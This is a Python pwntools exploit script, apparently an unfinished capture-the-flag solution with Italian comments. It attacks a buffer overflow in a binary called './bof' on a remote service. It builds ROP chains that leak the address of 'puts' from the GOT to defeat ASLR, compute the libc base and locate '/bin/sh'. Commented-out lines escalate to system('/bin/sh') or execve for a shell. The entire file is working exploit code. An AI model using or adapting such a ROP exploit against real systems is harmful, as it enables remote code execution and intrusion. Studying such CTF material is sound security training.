from pwn import *
from pprint import pprint
import subprocess

context.arch = 'amd64'
context.binary = elf = ELF('/lib/x86_64-linux-gnu/libc.so.6')

offset = 9

elf = ELF("./bof")
libc = elf.libc

p = connect('spclr.ch', 1337)


rop = ROP([elf, libc])

rop.call('puts', [elf.got['puts']])
rop.call('vuln')

print(p.recvuntil("\n"))

payload = [
    b"\xf4",
    b"A"*offset,
    rop.chain()
]

payload = b"".join(payload)
p.sendline(payload)

print(rop.dump())

puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))
libc.address = puts - libc.symbols["puts"]

print(p.recvuntil("\n"))

log.info(f"puts adress found at : {hex(puts)}")
log.info(f"libc startadress at : {hex(libc.address)}")

# # --- PROVE --- #
# prova1 = elf.got["puts"]
# prova2 = elf.plt["puts"]
# prova3 = elf.symbols["puts"]
# log.info(f"test position GOT puts : {hex(prova1)}")
# log.info(f"test position PLT puts : {hex(prova2)}")
# log.info(f"test position SYMBOLS puts : {hex(prova3)}")
# --- ***** --- #

binsh = next(libc.search(b"/bin/sh\x00"))

rop = ROP([elf, libc])

# rop.call("win") # per leakare la flag 1

# rop.execve(binsh, 0, 0) # posso fare run della shell cos√¨

#rop.call('puts', [elf.got["puts"]]) # oppure con queste due chiamate
rop.call('fprintf', ["%d\n"]) 
# rop.call('system', [binsh])

payload = [
    b"\xf4",
    b"A"*offset,
    rop.chain()
]

print(rop.dump())

payload = b"".join(payload)
p.sendline(payload)

print(p.recvuntil("\n"))
# pprint(libc.symbols)

log.info(f"payload : {payload}")

# p.interactive()

#log.info(f"STDOUT : {stdout}")

# flag = p.recvuntil("\n")

# log.info(f"flag : {flag}")
# puts = u64(p.recvuntil("\n").rstrip().ljust(8, b"\x00"))

# libc.address = puts - libc.symbols["puts"]

# log.info(f"puts found at {hex(puts)}")
# log.info(f"libc base adress {hex(binsh)}")

# rop = ROP([elf,libc])

# rop.call("puts", [binsh])
# rop.call("system", [binsh])
# # rop.execve(binsh, 0, 0)

# print(rop.dump())

# payload = [
#     b"A"*offset,
#     rop.chain()
# ]
# payload = b"".join(payload)

# p.sendline(payload)

# p.interactive()
